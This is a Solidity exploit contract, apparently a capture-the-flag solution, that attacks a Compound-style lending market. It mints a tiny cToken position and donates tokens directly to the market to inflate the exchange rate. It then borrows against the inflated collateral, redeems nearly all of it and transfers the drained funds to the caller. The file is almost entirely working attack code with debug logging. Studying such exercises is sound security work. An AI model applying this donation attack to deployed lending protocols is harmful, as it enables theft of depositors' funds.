// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/challenge/Challenge.sol";

contract Exploit {
    /* Code here */
    CErc20Immutable ctoken;

    AppworksToken underlying;

    AppworksToken CWETH;

    CErc20Immutable CCWETH;

    Comptroller comptroller;

    Challenge chall;

    uint256 borrowAmount;

    constructor(address _ctoken, address _underlying, address _chall, uint256 _borrowAmount) {
        ctoken = CErc20Immutable(_ctoken);

        underlying = AppworksToken(_underlying);

        chall = Challenge(_chall);

        CWETH = chall.CWETH();

        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();

        borrowAmount = _borrowAmount;
    }

    function drain() external {
        console2.log("CCWETH balance: ", CCWETH.balanceOf(address(this)));
        console2.log("CWETH balance: ", CWETH.balanceOf(address(this)));
        CWETH.approve(address(CCWETH), type(uint256).max);
        CCWETH.mint(2);
        address[] memory cToken = new address[](1);
        cToken[0] = address(CCWETH);
        comptroller.enterMarkets(cToken);

        console2.log("exchangeRateStored: ", CCWETH.exchangeRateStored()/1 ether);

        CWETH.transfer(address(CCWETH), CWETH.balanceOf(address(this)));

        console2.log("exchangeRateStored: ", CCWETH.exchangeRateStored()/1 ether);
        console2.log("getCashPrior: ", CCWETH.getCash()/1 ether);
        console2.log("underlying balance: ", underlying.balanceOf(address(this))/1 ether);
    
        ctoken.borrow(borrowAmount);
        console2.log("exchangeRateStored: ", CCWETH.exchangeRateStored()/1 ether);

        CCWETH.redeemUnderlying(10000 ether - 1);
        (,, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        console2.log("shortfall: ", shortfall);
        console2.log("CCWETH balance: ", CCWETH.balanceOf(address(this)));
        console2.log("CWETH balance: ", CWETH.balanceOf(address(this)));
        console2.log("underlying balance: ", underlying.balanceOf(address(this))/1 ether);
        
        underlying.transfer(msg.sender, underlying.balanceOf(address(this)));
        CWETH.transfer(msg.sender, CWETH.balanceOf(address(this)));
    }
}